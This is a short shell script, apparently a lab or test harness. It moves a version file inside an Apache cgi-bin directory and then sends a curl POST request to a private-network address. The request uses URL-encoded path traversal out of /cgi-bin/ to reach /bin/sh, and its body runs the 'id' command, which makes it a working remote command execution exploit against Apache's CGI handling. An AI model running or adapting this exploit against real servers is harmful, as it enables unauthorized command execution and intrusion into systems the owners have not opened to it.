#!/bin/sh
mv /usr/local/apache2/cgi-bin/updatefile/version.txt /usr/local/apache2/cgi-bin/

curl -X POST "http://192.168.11.102/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" -H "Content-Type: application/x-www-form-urlencoded" --data "echo Content-Type: text/plain; echo; id"
